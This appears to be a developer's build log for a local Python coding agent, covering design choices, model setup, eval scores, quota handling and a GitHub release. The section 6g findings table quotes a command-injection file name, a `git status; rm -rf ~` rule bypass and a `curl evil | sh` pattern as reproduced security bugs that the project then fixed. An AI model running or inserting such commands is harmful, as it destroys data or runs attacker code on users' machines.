# Build log — everything we did, why, and how

This page is the story of the project in order: what you asked for, what was decided, what was built, what went wrong,
how each problem was fixed, and what the measurements say. Read it after `00-overview.md`. The per-file pages explain
*the code line by line*; this page explains *the decisions around the code*.

## 1. What you asked for
1. A coding agent "just like Claude Code": generates code, correct code, **minimum model calls and tokens**.
2. **Python.**
3. **Verify code before running it**: check for errors, fix, check again.
4. **Local models** so there is no cost and testing is unlimited — "the best available".
5. **Docs for every file and every line**, so the whole flow can be understood from the docs alone.
6. Do the installs and work yourself; make a **fully working, scalable system built in phases**; use **GPU offloading** if it helps.

## 2. Design decisions and the reason for each
| Decision | Why |
|---|---|
| Plain Python standard library for the agent itself | No dependency to break or audit; installs anywhere; easy to read line by line. Only `ruff`/`mypy` are optional extras. |
| One small "agent loop": model → tool calls → results → model | This is the whole idea of Claude Code. Everything else (verification, trimming, undo) hangs off this loop. |
| Hard `max_turns` stop | A weak model can loop forever; the cap bounds cost and time. |
| **Append-only** message history | Servers keep a cache of the already-processed prompt prefix. Editing earlier messages would invalidate it and force re-processing (slow on CPU). |
| File tree + `AGENT.md` placed in the system prompt | Saves the 2–3 model calls the model would otherwise spend listing and exploring. |
| Several tool calls allowed in one turn | One model call can read three files instead of three calls reading one each. |
| `search` tool and line-range `read_file`, `edit_file` with unique match, output truncation | Send the model only the lines it needs; every token on a CPU costs seconds. |
| **Write gate** (`_commit`): write → verify → keep or **roll back** | Your requirement 3. Broken code never stays on disk; the model sees the exact errors and retries. After 3 failures for one file the tool says `STOP`. |
| **Run gate**: verify again before executing, then ask permission | Second check right before the code can do anything. |
| End-of-request `check_workspace()` | Costs no model calls; catches any file broken some other way. |
| Verification layers: `compile()` always, `ruff` rules `E9,F63,F7,F82` if installed, `mypy` opt-in | `compile` is always available; ruff catches undefined names without style noise; mypy is slow so it is opt-in. |
| `ChatBackend` protocol + registry (`ollama`, `openai`) | The agent never knows which server it talks to. This is what lets us switch from Ollama to llama.cpp, or later to a big remote model, by changing a flag. |
| Frozen `Config` dataclass | One immutable object for all settings; no hidden global state. |
| Sessions logged as JSONL; `/undo` snapshots | Resume a conversation; reverse the last request's file changes. |
| Evals with automatic checks | The only honest way to know whether a change (prompt, model, setting) made things better. |
| Docs built from the code by `tools/build_docs.py`, which fails if any line is undocumented or documented twice | Your "every line" requirement enforced by a program, so docs cannot silently rot. |

## 3. Phases built
* **Phase 1** — the loop, tools, sandbox, verification, config, CLI, tests, docs.
* **Phase 2** — streaming output, OpenAI-compatible backend, doctor, checkpoints/undo, sessions/resume, `search`, tool-call ids,
  history trimming, eval harness, packaging, CI template.
* **Phase 2.5 (this session)** — got a real model running, ran the evals, fixed what the real model exposed (section 6),
  added GPU offload, added `--trace`.
* **Phases 3-10** — see sections 5-6g; version 0.6 is Phase 10.
* **Planned** (see `02-roadmap.md`): parallel tool execution, auto-format on write, patch-style edits, repo map, subagents,
  service mode, containers for running untrusted code.

## 4. Getting a model running — what happened
Hardware: 15.7 GB RAM, Intel i7-1255U, NVIDIA MX550 with 2 GB VRAM, Intel UHD graphics, 56 GB disk.

1. **Ollama via winget** stalled at 0 bytes for ~27 minutes. The direct installer download ran at ~40 KB/s. ollama.com is
   effectively unusable from this network, so Ollama was abandoned for now (the code still supports it).
2. **Measured the network** to each host: Cloudflare ≈14 MB/s, Hugging Face ≈16–28 MB/s, GitHub ≈2–60 KB/s.
   Conclusion: get the **model from Hugging Face** and the **server (llama.cpp) from somewhere faster than raw GitHub**.
3. **llama.cpp's `llama-server`** speaks the OpenAI-style API, so our existing `openai` backend works unchanged.
4. **Model:** `Qwen3-8B-Q4_K_M.gguf` (4.7 GiB), from Hugging Face. Chosen because Qwen3-8B is the strongest 7–8B model for
   tool calling that fits 15.7 GB RAM; 4-bit "Q4_K_M" is the standard size/quality trade-off.
5. The first attempt downloaded both files in the background and **Claude Code killed them for low system memory**.
   You freed memory, the downloads were resumed with `curl -C -` (resume from the partial file).
6. The GitHub zip stayed at 2–6 KB/s, so a **public GitHub relay (gh-proxy.com)** was used (≈1.4 MB/s). Because a relay
   could in principle alter an executable, the zip's **SHA-256 was compared with the digest published by GitHub's own API**
   for that release asset. Both the CPU build and the Vulkan build matched exactly before being unzipped.
7. The unzip of a downloaded archive went into its own fresh folder (`bin/llamacpp`, `bin/llamacpp-vulkan`) — downloaded files
   are never mixed with project code.

## 5. Speed work (CPU, thinking, GPU)
* **Qwen3 "thinking".** By default Qwen3 writes hundreds of hidden-reasoning tokens before each answer (one call produced 717
  tokens at ~3.4 tokens/s ≈ 3.5 minutes). Starting the server with `--reasoning-budget 0` skips it. First real eval step went
  from ~182 s to ~107 s.
* **GPU offload (Vulkan).** The CPU zip has no GPU support, so the **Vulkan build** was added. `llama-bench` on this PC
  (Qwen3-8B Q4_K_M, 6 threads):

  | GPU layers (`-ngl`) | prompt tokens/s | generated tokens/s |
  |---|---|---|
  | 0 (CPU only) | 51.6 | 3.25 |
  | 10 | 80.8 | 4.31 |
  | 11 | 96.1 | **4.70** |
  | 13 and up | crashes (out of the MX550's 2 GB) | — |

  So the 2 GB card can hold only ~11 of the model's 36 layers: **+45 % generation, +86 % prompt speed**. This is a real but
  limited gain — a GPU with more memory would move far more. `serve.ps1` defaults to **9 layers** (`-GpuLayers`) because the
  server also needs GPU memory for the context cache; `-GpuLayers 0` selects the CPU build. The full eval then ran fizzbuzz in
  88 s (vs 107–182 s before).

## 6. What the real model taught us (eval results and fixes)
First real runs (CPU, thinking off) scored **2/4**; the table shows how each failure was handled.

| Task | Failure seen with `--trace` | Fix |
|---|---|---|
| `fix_bug` | Model searched for guessed names (`add`, `subtract`...), read the files, then answered in text **without editing** | System prompt rules 8 and 9: act with tools instead of describing; never search for guessed names; bug-fix recipe (run tests → read → smallest edit → run tests) |
| `add_method` | Model edited the existing `pop` method instead of adding `peek`, then declared success | Rule 10: re-read the request, verify every requested name exists by running a tiny script, never alter existing behaviour when asked to add |

After the prompt changes (GPU server): fizzbuzz PASS, add_method PASS, word_count PASS, **fix_bug FAIL** (the model stopped
after reading `calc.py`). A previous run of the same task had passed, so this is **sampling variance of an 8B model**, not a
code defect. Honest score: **3/4 on this run, 4/4 reachable but not yet reliable**. Ideas to raise reliability, in order of
cost: temperature 0 for agent runs; an automatic "you have not changed any file yet" nudge when a reply has no tool calls and
nothing was written; a larger model or `qwen2.5-coder:14b` when more RAM is free; self-consistency retries on failed tests.

## 6b. Next phases built after the first real-model results
After the 3/4 result we built the following, in this order, each one justified by something observed:

| # | Feature | Why (what was observed) | Where |
|---|---|---|---|
| 1 | Temperature 0.2 -> **0.0** | the same task passed one run and failed the next | `config.py` |
| 2 | **Nudge**: if the request starts with an action verb and no file was written, send one reminder | the model read `calc.py`, explained the bug in text and stopped | `agent.py` `_wants_change`, `NUDGE` |
| 3 | **Parallel** read-only tool calls (`list_files`, `read_file`, `search`, `outline`) in a thread pool, results kept in order | several reads in one turn waited one after another | `agent.py` `_execute` |
| 4 | **`ruff format`** after every verified write | consistent style for free, no model calls | `tools.py` `_format` |
| 5 | **`multi_edit`** tool: many exact replacements, one call, one verification, all-or-nothing | fewer calls than repeated `edit_file` | `tools.py` |
| 6 | **`outline`** tool: classes/functions with line numbers (repo map) | big projects should not need whole-file reads | `tools.py` |
| 7 | **Repeat guard**: an identical write call is refused the second time and the request stops at the third | at temperature 0 the model sent the same `edit_file` 18 times (20 calls, 43k tokens) | `agent.py` `_run_one` |
| 8 | Prompt rule 11: how to add a method (anchor on the last unique line) | the model kept rewriting `pop` instead of adding `peek` | `context.py` |
| 9 | **Service mode**: authenticated HTTP API, one agent + isolated folder per session, concurrent sessions | first step of Phase 5 (run as a service) | `server.py` |

| 10 | **Five more eval tasks** (`counter_class`, `rename_function`, `json_key`, `default_arg`, `add_tests`) - 9 in total | 4 tasks were too few to trust; the new ones cover a class from a spec, a multi-file rename, JSON reading, a one-word edit that must not touch anything else, and writing tests | `evals/tasks.py` |
| 11 | **`edit_file all=true`** (rename every occurrence) | `rename_function` failed: a name used twice in `main.py` hit the unique-match rule and the model got stuck (the repeat guard stopped it after 8 calls instead of 20) | `tools.py` |
| 12 | **Server limits**: at most 20 live sessions (HTTP 429 when full), sessions idle for an hour expire, both configurable | open service must not grow without bound | `server.py` |

Each feature has unit tests (57 in total) and its own section in the page for its file. Things that were deliberately
**not** done and why: model-written conversation summaries (an extra slow model call; the cheap trimming is enough for
now), a unified-diff patch tool (`multi_edit` covers the common case with far less risk of malformed patches from a small
model), and containers for untrusted code (needs Docker, not installed here).

## 6c. Gemini, Docker, and what the free tier really allows
You asked whether Gemini's free tier (12-15 requests/minute) would be too slow. Measured answer: **no** — the local 8B
model needs 15-40 s per call, Gemini 1-3 s, so even with waiting for the per-minute limit Gemini is much faster.
What we built, in order, and why:

| # | Step | Why / what was observed | Where |
|---|---|---|---|
| 1 | Probed the key: listed models, sent one tool-calling request to five models | `gemini-3.5-flash` 2.0 s, `gemini-2.5-flash` 1.5 s; two others returned **503 "high demand"**; total tokens > prompt + answer (hidden thinking) | — |
| 2 | `LLMError.status` | retry decisions need the HTTP code | `llm.py` |
| 3 | Keep Gemini **thought signatures**; send `reasoning_effort`; count hidden thinking tokens | Gemini 3 requires signatures to be returned; thinking tokens count against quota | `openai_compat.py` |
| 4 | `RateLimiter` (RPM wait, TPM wait, RPD refuse; persisted; Pacific-time reset) | stay inside free-tier limits instead of collecting 429s | `ratelimit.py` |
| 5 | `FallbackBackend`: retries with backoff, model chain, local model last | 503/429 happen in normal use | `resilient.py`, `backends.py` |
| 6 | First live run: fix_bug passed in 6 calls / 45 s through Gemini | the plumbing works end to end | — |
| 7 | Docker sandbox image + `DockerRunner` + `run_shell` | run model-written code isolated: no network, 1 GB, 1 CPU, 256 processes, non-root, timeout kill | `docker/`, `runners.py`, `tools.py` |
| 8 | Bug: containers left running after evals | clean-up ran in an already-deleted temp folder (Windows refuses) → clean-up without a folder + `ToolBox.close()` | `runners.py`, `evals` |
| 9 | 429 inside our own limit → read Google's `retryDelay` | Google said how long to wait; we now wait exactly that | `resilient.py` |
| 10 | `--doctor` for Docker and Gemini; agent image; compose service | beginners see what is missing; the whole agent can run isolated | `doctor.py`, `Dockerfile`, `docker-compose.yml` |
| 11 | **Discovery: real daily quota ≈ 20 requests** for `gemini-3.5-flash` and `gemini-2.5-flash` on this key (not 1500) | Google's 429 said `"quotaValue": "20"`. The agent now reads that number, marks the model used up until midnight Pacific, shows `x/20` in `/stats`, announces the switch; per-model limits can be configured | `ratelimit.py`, `resilient.py`, `backends.py` |
| 12 | **Bug: "Function call is missing a thought_signature"** (HTTP 400) after a mid-task model switch | history held tool calls from a model that makes no signatures; Google's placeholder signature fixes it (verified live) | `openai_compat.py` |
| 13 | Default chain extended with `gemini-3.5-flash-lite` (1.2 s, tool calls OK) and `gemini-3.1-flash-lite`; Gemma left out (HTTP 500 on histories with tool calls) | the 20/day models run out fast; lighter models carry the load | `config.py` |

**Final measurement (one clean run of the final code):** 9/9 tasks passed with the Gemini chain, code executed in the
Docker sandbox, local model as last fallback. Per task: 5-11 model calls, 6-24 s (the local model needed 1-3 minutes per
task). Because the two "flash" models had used their ~20 daily requests, every answer came from `gemini-3.5-flash-lite`
(66 requests for the whole suite). No sandbox containers were left behind.

Practical budget: with ~20/day on the strongest models, a day's work mostly runs on the flash-lite models; the chain
does this automatically. If the whole chain is used up, `--fallback openai` keeps you working on the local model.

## 6d. Phase 6: fewer API calls and cheap-first routing
**Goal:** do the same work with fewer requests so the free daily quotas last, and stop spending the scarce strong-model
requests on routine steps.

**Diagnosis (traced run on `gemini-3.5-flash-lite`):** the model listed the root folder although the file list is in the
prompt, ran tests before any existed, read a file twice, ran the same script twice, created test files nobody asked
for, used one tool per response, and always spent one extra call just to say "done".

| # | Change | Where |
|---|---|---|
| 1 | **`finish` tool**: end the task in the same response as the last write/run; refused if anything in that response failed or nothing was changed yet | `agent.py` (`FINISH_SPEC`, `failed`, `_finish_summary`) |
| 2 | Prompt rewritten around "every response is a slow, rate-limited call": batch calls, no root listing, no re-reads, run once, finish in the same response, no unrequested files | `context.py` |
| 3 | **Cheap-first routing**: everyday chain `gemini-3.5-flash-lite` > `gemini-3.1-flash-lite` > `gemini-2.5-flash-lite`; the strong `gemini-3.5-flash`/`gemini-2.5-flash` (~20/day) are a reserve | `config.py`, `backends.py`, `resilient.py` |
| 4 | **Escalation**: after 2 failed tool results in one request, the strong reserve goes first until the request ends | `agent.py`, `resilient.py` (`escalate`, `reset_route`, `_order`) |
| 5 | **Learned per-minute limit**: a per-minute 429 that states the limit lowers the limiter, so later requests wait instead of failing | `ratelimit.py` (`set_rpm`), `resilient.py` |

**Measured (same 9 tasks, same sandbox, before → after):**

| | Before | After | Change |
|---|---|---|---|
| Tasks passed | 9/9 | 9/9 | same quality |
| Model calls (all 9 tasks) | 66 | **34** | **−48 %** |
| Tokens | ~102 800 | **~55 100** | **−46 %** |
| Calls per task | 5-11 | 1-7 | two tasks now need a single call |
| Strong-model requests used | — | 0 | the reserve stays available |

What the 34 calls did (40 tool calls inside them): 9 `write_file`, 9 `finish`, 8 `run_python`, 6 `read_file`,
3 `run_tests`, 3 `edit_file`, 1 `search`, 1 `multi_edit` — no root listings and no repeated runs any more.
Budget meaning: with ~4 calls per small task, the lite models' daily quota covers a few hundred tasks a day, and the
strong reserve is only touched when a task is going wrong.

## 6e. Phases 7 and 8: working like Claude Code day to day
**Goal:** start it in any project with one word, and have the everyday features Claude Code users rely on.

| # | Feature | Why | Where |
|---|---|---|---|
| 1 | `localagent` command for any folder; the current folder is the workspace | Claude Code works where you start it | `install.ps1`, `config.py` |
| 2 | Folder walking that never enters `node_modules`, `.venv`, `.localagent` ... | real projects hold 100 000+ files in such folders | `sandbox.py` |
| 3 | One quota file per user (`~/.localagent/usage.json`) | quotas belong to the key, not the project; shared with containers by a mount | `config.py` |
| 4 | Checks for JSON, TOML, JavaScript besides Python | real projects are not only Python | `verify.py` |
| 5 | `todo` checklist, compaction (`/compact` + automatic), `/init` with `AGENT.md` | Claude Code's to-dos, compaction and `CLAUDE.md` | `tools.py`, `agent.py`, `cli.py` |
| 6 | Opt-in shell on the computer (`--allow-shell`); git + node in the sandbox | git/npm/pip work like in Claude Code | `runners.py`, `docker/` |
| 7 | Automatic setup (Gemini / Docker / local fallback / 32K history for Gemini) | plain `localagent` should pick the best available setup | `cli.py` |
| 8 | Permission rules (`settings.json` allow/deny, "always" answers saved) | fewer questions for safe actions, hard stops for dangerous ones | `settings.py`, `tools.py`, `cli.py` |
| 9 | Diff of every edit on screen | see exactly what changed; never sent to the model (no token cost) | `tools.py`, `agent.py` |
| 10 | `/plan` (read-only investigation → plan → run on approval) | Claude Code's plan mode | `agent.py`, `cli.py` |
| 11 | `fetch_url` (documentation pages, approval per website) | Claude Code's WebFetch | `web.py`, `tools.py` |
| 12 | MCP client (stdio servers from settings) | Claude Code's way to add tools | `mcp.py`, `tools.py` |
| 13 | Ctrl+C stops a task and repairs the history; multi-line input | a stopped task must not break the conversation | `agent.py`, `cli.py` |
| 14 | Retired models (404) skipped; learned per-minute limits saved; "edit together" hint | each found in a real run (below) | `resilient.py`, `ratelimit.py`, `tools.py` |

**Bugs that only a real end-to-end run could find** (a separate to-do-app project with a planted bug, driven through the
installed command exactly as a user would):

1. **`/init` "fixed" the project instead of writing `AGENT.md`.** Tracing it showed the real cause was not the model
   at all: text piped into a program by PowerShell can start with an invisible byte-order mark, so the agent received
   `\ufeff/init`, did not recognise the command, and passed it to the model as an ordinary request — which the model
   read as "look around and fix things". Fix: strip the mark from input. Defence in depth: `/init` now offers only
   read-only tools plus `write_file` and reports whether `AGENT.md` exists afterwards. Re-run: 3 calls, correct notes.
2. **Plan mode refused the `todo` checklist** (it is not a read-only tool). A checklist changes nothing, so plan mode
   now offers it.
3. **The checklist always said `0/4 done`**: the model wrote "(done)" into the item text instead of setting `done`.
   The tool now understands such marks.
4. Earlier in this phase the evals found: `gemini-2.5-flash-lite` answering HTTP 404 ("no longer available to new
   users") and crashing a task — retired models are now skipped; `rename_function` failing because the two halves of a
   rename were sent as separate edits, the first of which the write gate (correctly) rejected as inconsistent — the
   rejection now carries a hint to send related edits together in one `multi_edit`.

**End-to-end result** (Gemini lite model, Docker sandbox, automatic setup, `/plan` then approval): the agent fixed the
planted bug, added `done N` and `--json` to the app's command line, wrote `tests/test_cli.py`, and ran the tests — 17
model calls for the whole session. Checked independently afterwards: 4/4 tests pass, `add "Buy milk" "Call mum" done 1`
prints `1. [x] Buy milk`, `--json` prints `[{"title": "A", "done": false}, {"title": "B", "done": true}]`, and no
sandbox container was left running.

**Final eval of this code (one clean run, 5 Nov 2026, Gemini lite chain, Docker sandbox): 11/11 tasks passed** —
fizzbuzz 5 calls, fix_bug 5, add_method 7, word_count 3, counter_class 4, rename_function 6, json_key 3, default_arg 3,
add_tests 4, package_feature 4, js_slugify 8: **52 model calls and ~113 000 tokens for all eleven**, 35-112 s per task
(Google was slow that day; 3 overload errors were retried automatically). The strong reserve models were not needed.

## 6f. Phase 9: every common language, any question, real-size projects
**Your requests:** all languages, random questions, "several things" an agent should have, careful use of the API
quota, complete documentation — and an API key decision (below).

| # | Built | Why / evidence | Where |
|---|---|---|---|
| 1 | Syntax checks for TypeScript, Go, Rust, C/C++, PHP, Ruby, shell, PowerShell, YAML | each tested here with a valid and a broken file; TypeScript uses Node's own type stripper because `node --check` rejects every type annotation (measured), in `transform` mode so `enum` works (measured: `strip` mode rejects it) | `verify.py` |
| 2 | C/C++ "missing header" is not an error | a valid file using an outside library would otherwise be rejected | `verify.py` |
| 3 | Sandbox image with Go 1.24, Rust 1.85, gcc 14, Node 20 | verified: `go run`, `rustc`, `gcc` all compiled and ran inside the container | `docker/` |
| 4 | Direct answers to questions; the finish summary must BE the answer | live: a question first ended with "Explained how rate limits work in 6 sentences" — the description, not the answer; after the fix the reply contained the explanation | `context.py`, `agent.py` |
| 5 | Streaming | live: llama.cpp streamed a tool call and a 16-piece answer; Gemini streamed a tool call with its thought signature | `openai_compat.py` |
| 6 | Helper agents (`delegate`) | live on this project: a helper investigated read-only (its steps shown with `|`), the main agent answered with file names — 8 calls, 11.7 s | `agent.py` |
| 7 | Custom slash commands; unknown commands answered locally | typos must not cost an API call | `settings.py`, `cli.py` |
| 8 | Paid-tier preset; `LOCALAGENT_RPM/RPD/TPM` | the supported way to get more quota | `config.py`, `backends.py` |
| 9 | Changed-files-only checks; snapshot and search limits | in a 500-file project the old end-of-request check started ~500 checker processes; a home-folder session would have copied gigabytes for `/undo` | `tools.py`, `checkpoint.py`, `cli.py` |
| 10 | Four new eval tasks (2 questions, Go, TypeScript) with answer checking | measure what was asked for | `evals/` |
| 11 | `05-user-manual.md` | one reference for everything | docs |

**Live checks of this phase** (session logs read back to verify): a general question — 1 call, no tools, correct; a
typo command — 0 calls; a TypeScript file — 2 calls, checked by the new TypeScript checker; a delegated investigation
— 8 calls, correct sourced answer.

**Eval results of this phase.**
- Gemini (lite chain, Docker sandbox), 15 tasks: **14/15** on the first run — the one failure was the scorer, not the
  agent: the answer "the server cannot find the requested resource" was correct but lacked the exact words "not found".
  The scorer now accepts the usual wordings; the task then passed (1 call). 49 calls for the whole suite.
- **Final clean run of the final code (Gemini, Docker sandbox): 15/15 passed — 48 model calls and ~111 000 tokens
  for all fifteen tasks, 1-8 s per task.** Questions took 1-2 calls, the Go and TypeScript tasks 1 call each.
- Local Qwen3-8B (llama.cpp, Docker sandbox, no quota used), same 15 tasks: **12/15** — the offline path works with
  streaming, `finish`, questions, Go and TypeScript; `counter_class`, `add_tests` and `js_slugify` failed. Each task
  took 1-5 minutes (Gemini: 2-14 s). The failures were not traced: the local model server was stopped by Claude Code
  for low system memory before they could be re-run, and was not restarted without your say-so. Given that Gemini
  passes the same tasks, the likely cause is the smaller model, but that is unconfirmed.

**Found in a final review** (both now fixed and documented): a helper agent could reset or trigger the main agent's
escalation (it shares the model chain); and with piped output on Windows, one emoji in an answer could crash the CLI.

**One key, by design.** Spreading requests over several free keys from several Google projects would multiply
the quota, so the question came up and Google's rules were checked: limits are enforced per project; the Google APIs
Terms say users "will not attempt to circumvent" the documented limits; and Google has restricted projects (quota set
to 0) for "operating multiple projects as a single project". The agent therefore works with exactly one key and makes
the most of it (lite models first, the local model as backup). For more quota the supported route is billing on one
project — the `paid` preset uses it.

**Final verification (5 Nov 2026).** Everything was run the way a new user would, and every problem found was fixed,
tested and documented:
- Clean install: a brand-new virtual environment + `pip install <agent folder>` (26 s) gives a working `localagent`
  command.
- Standalone run in an empty folder: the agent built a Python expense tracker with passing tests and a Node.js report
  script, answered a project question and a general question — 12 calls, 47 s. Re-checked by hand: tests pass, both
  programs work.
- `--resume`, the agent's own Docker image (doctor + a request), and the HTTP server (health, 401 without the token,
  a coding request in a per-session sandbox container, file listing) all worked live.
- Final eval with all fixes: **15/15**, 64 calls, ~152k tokens (the run before the fixes: 48 calls — the extra calls
  are mostly the agent now looking at what it read before answering, plus normal run-to-run variation).

| Found | Fix |
|---|---|
| A question answer was written in the same response as `read_file`, before the file was seen — and was wrong | `finish` is refused next to a read/search/list/outline/fetch/delegate (`agent.py`), the tool description and rule 14 say so |
| Session logs went to the folder the agent was started *from*: with `--workspace`, `--resume` could continue another project's chat | logs live in `<project>\.localagent\sessions` (`cli.sessions_folder`) |
| Closing an MCP server left two file handles open (`ResourceWarning` in the tests) | close its input first (the MCP spec's shutdown), then wait, terminate, kill, close the output (`mcp.py`) |
| Stopping the HTTP server left each session's sandbox container running | `close_all` on Ctrl+C (`server.py`) |
| Server sessions on Gemini used the 8K local-model history budget | same 32K rule as the chat (`server.py`) |
| The doctor printed `FAIL` in the Docker image whenever the optional local backup was off | it is a `note` now (`doctor.py`) |
| `docker-compose.yml` mounted an unused `.localagent` folder "for session logs" | mount removed; Dockerfile no longer creates it |
| Stale text: language lists, task counts, a duplicated sentence | corrected in README, `04`, `05`, `00`, `tools.md` |

**Redundancy clean-up (6 Nov 2026).** One rule, one place:
| Was duplicated | Now |
|---|---|
| `--backend/--model/--api-base/--sandbox` declared and applied separately in the chat, the server and the evals | `cli.add_model_flags` + `cli.model_flags` + `config.overlay`, used by all three |
| The Gemini 32K history rule in the chat and (a copy) in the server; the evals lacked it, so they measured a different setup | `config.gemini_history`, called by all three |
| "PowerShell on Windows, `sh` elsewhere" in the host runner and in hooks | `sandbox.shell_argv` |
| `requirements-dev.txt` repeated the `dev` extra of `pyproject.toml` | removed; install with `pip install -e ".[dev]"` |
| `RateLimiter.requests_today` (used only by a test) | removed; the test reads `status()` |
| `build/` (a stale second copy of the code), `bin/llamacpp-dl` (60 MB of already-unpacked zips), `models/dl.log`, empty `workspace/` | deleted |
| Docs: the "how it works" story existed in three versions (`00`, `04` Part 7, `05`), install steps in `01` and `04`, "ways to run" in `05` and `06` | `00-overview` is the single explanation (with a traced request and a code reading order); `01` covers only the offline model; `04` and `05` point to `00` and `06` |
Also: a stray byte-order mark removed from `evals/__init__.py`. 141 tests, lint, types and the docs audit pass.

## 6g. Phase 10 (version 0.6): review everything, fix it, online/offline, ready to ship
**Your requests (20 Nov 2026):** go through the whole project and collect every feature worth adding; fix the issues it
has; add switching between the offline and the online model; later a website to download it as a product — but first
refine the product until it is right in itself, working like Claude Code. Midway you also put the project on GitHub
and asked for a clean first commit, no threats later, your account shown but **no e-mail leak**, and a private
repository.

**Method.** All automated checks were green (141 tests, lint, types, docs), so the remaining problems could only be
found by reading every file and then **proving** each suspicion with a small probe script before changing anything.
Twenty suspicions were tested; **all twenty reproduced**. After the fixes the same probes were run again: none
reproduces. (Probe scripts: kept outside the project; each became a unit test in `tests/test_phase10.py`.)

| # | Found (reproduced) | Why it mattered | Fix |
|---|---|---|---|
| 1 | A hook `ruff check {file}` with a model-chosen file name `a$(New-Item ... PWNED).txt` **created the file** | the model could run any command on your PC, unasked | `sandbox.quote_for_shell` |
| 2 | Allow rule `run_shell(git status*)` also allowed `git status; rm -rf ~` | one "always" answer opened every command | `settings.command_parts`: every part must be allowed |
| 3 | An "always" for `ls *.py` saved a rule matching `ls x; curl evil \| sh; .py` | saved rules acted as wildcards | `settings.escape_pattern` |
| 4 | One edit of an LF file on Windows rewrote **every line** as CRLF; even a rejected write did | whole-file churn in git | `tools.read_text`/`write_text`, byte rollback |
| 5 | `edit_file` with an empty `old` and `all=true` turned `abc` into `XaXbXcX` | silent file corruption | refused |
| 6 | `search` without a glob looked only at `*.py` | in JS/Go/Rust projects it found nothing | all text files, `.gitignore` honoured |
| 7 | A valid `tsconfig.json` (comments) was **rejected and rolled back** | TypeScript projects could not be configured | JSONC accepted for the right files |
| 8 | A valid C++ header named `.h` was rejected | C++ projects | C *or* C++ check |
| 9 | `main.rs` declaring a not-yet-written module was rejected | Rust projects | rustfmt reads the file from its input |
| 10 | `run_tests` found 0 tests in a plain `tests/` folder (exit code 5) | pytest-style projects | `-s tests`, pytest / npm / go / cargo detection, the project's `.venv` |
| 11 | `read_file` of a binary file returned thousands of garbage characters | wasted tokens; a 5 GB model could be loaded | refused; big files read in parts |
| 12 | The history size ignored tool-call arguments (50 KB counted as 3 KB) | 8K local contexts overflowed unnoticed | `llm.message_size`, `fit_history` |
| 13 | `--resume` after `/reset` brought the cleared conversation back | privacy and context | event lines in the log |
| 14 | A half-written log line made `--resume` crash | crash-safety promise broken | bad lines skipped |
| 15 | `/undo` after a question did nothing; `/undo` also erased **your own** later edits | lost work | per-request steps, your edits kept |
| 16 | A 3-second timeout took 25 s when the program had started a child (forever for a server) | a frozen agent | process groups, `kill_tree` |
| 17 | Offline: **28 s of retry pauses on every model call**, every time | offline use was unusable | offline detection with a probe and cool-down |
| 18 | An empty model reply was shown as the answer | blank answers | retried once |
| 19 | Cut-off tool arguments became "bad arguments: KeyError('path')" | the model hunted the wrong problem | `BAD_ARGUMENTS`, cut-off answers rescued |
| 20 | `LOCALAGENT_NUM_CTX=8k` crashed with a traceback | first-run experience | one `setup problem` line |

Found while reading, fixed with the rest: the file overview of this very project was 32 DLL names and no code; Windows
had no time-zone data, so the "new day" for quotas came an hour late in summer; usage counts were written non-atomically
(a half-written file erased all counts); every HTTP-server session had its own rate limiter (ten sessions = ten times
the limit); programs could read your keyboard; Python programs printing ✓ into a pipe crashed on Windows; Ollama as a
Gemini fallback was asked for a 32K window; Gemini-only fields were sent to every server; the non-streaming client
crashed on an unexpected body; "please fix ..." never counted as a change request; the version was written in three
places.

**Online / offline, as built.** Three modes (`auto` default, `online`, `offline`), chosen by flag, variable, settings file
or `/model` in the chat, with the conversation kept across a switch (`Agent.set_backend`). The new `localserver.py` finds
a running local server or starts llama.cpp itself — GPU layers fitted by llama.cpp's own `--fit`, so no hand-tuning per
computer — waits for it, fits the conversation into its 8K window, and stops it on exit; on Windows a job object ends it
even when the terminal window is closed. In `auto`, losing the internet switches to the local model within the same
call and back when Google is reachable again.

**Verified live (20 Nov 2026):**
- `--doctor` on this PC: mode auto, Gemini key accepted, `ok local model: Qwen3-8B-Q4_K_M.gguf (5027 MB), started with
  ...\bin\llamacpp-vulkan\llama-server.exe when needed`.
- `-p` with Gemini and an attached file: correct answer. First run **2 calls / 4 017 tokens / 14.8 s** (the model read the
  attached file again); after one sentence in prompt rule 1, **1 call / 2 004 tokens / 5.6 s**.
- The real `llama-server.exe` started with the agent's exact command line and a missing model: it rejected no argument
  and failed only on the model; the agent reported the log's last lines and left nothing running. The full
  start → wait → answer → stop cycle also runs in the tests against a fake server.
- **The real offline model, end to end** (once 6.8 GB of memory was free):
  - *Auto mode, internet "gone"* (Gemini's address made unresolvable, quota counts sent to a scratch file): Gemini was
    marked unreachable at once (no retry waits), llama.cpp started with Qwen3-8B by itself, loaded in about 20 s, and
    answered correctly ("adds 1 ... incorrect") — 2 calls, 50 s of model time, 70 s in all; then it was stopped.
  - *`localagent --offline -p ...` from the command line:* it answered correctly, but **revealed a bug**: the test file had
    been written by PowerShell with a byte-order mark, which the Python check took for a syntax error (see `verify.md`,
    `_compile_stage`). The local model then spent 9 calls and 191 s on a file that was fine. Fixed (compile the raw
    bytes; let an edit that names the mark remove it; ruff's "cannot read this encoding" is not a code error) and run
    again: **4 calls, 88 s, correct answer, no false failure, the file untouched.** Both times no `llama-server` process
    was left afterwards.
- Bad variable → `setup problem: LOCALAGENT_NUM_CTX must be a whole number such as 8192 (it is '8k')`, exit code 2.

**Putting it on GitHub safely.** Your first commit (made before this session's changes) could not have been pushed and
should not have been: it contained the **5 GB model** (GitHub refuses files over 100 MB — after uploading everything),
105 llama.cpp binaries, conversation logs, `__pycache__` and `egg-info` build files, no `.gitignore`, and your personal
Gmail address as author and committer of a **public** repository. Nothing had reached GitHub (the remote was empty).
What was done, with your agreement at each step:
1. `.gitignore` (models, binaries, logs, environments, caches, `.env`, keys) and `.gitattributes` (consistent line
   endings); the excluded files were removed from the commit but **kept on disk**. 261 tracked files became 112.
2. A scan of every tracked text file for API keys, tokens, private keys, e-mail addresses and personal paths: none.
3. The commit rewritten with a descriptive message, the author changed to GitHub's private address
   `<id>+Aditya-Singh-Chandel@users.noreply.github.com` (set for this repository only) — the commit still shows your
   account; afterwards no object in the repository mentions a Gmail address.
4. The old objects purged: `.git` went from **727 MB to 437 KB**; the largest object left is a 142 KB docs page.
5. The repository made **private** (at your choice). GitHub's free secret scanning only covers public repositories,
   which is one more reason for step 6.
6. The commit guard (`tools/check_commit.py`, enabled with `git config core.hooksPath .githooks`): refuses files over
   20 MB, model/key/`.env` files, secret-looking text and a public author address. Tested both ways.
7. CI: the workflow's token limited to reading, and a Windows job added.
A restore point of the pre-session source was also zipped to `..\localagent-v0.5.0-backup.zip`.

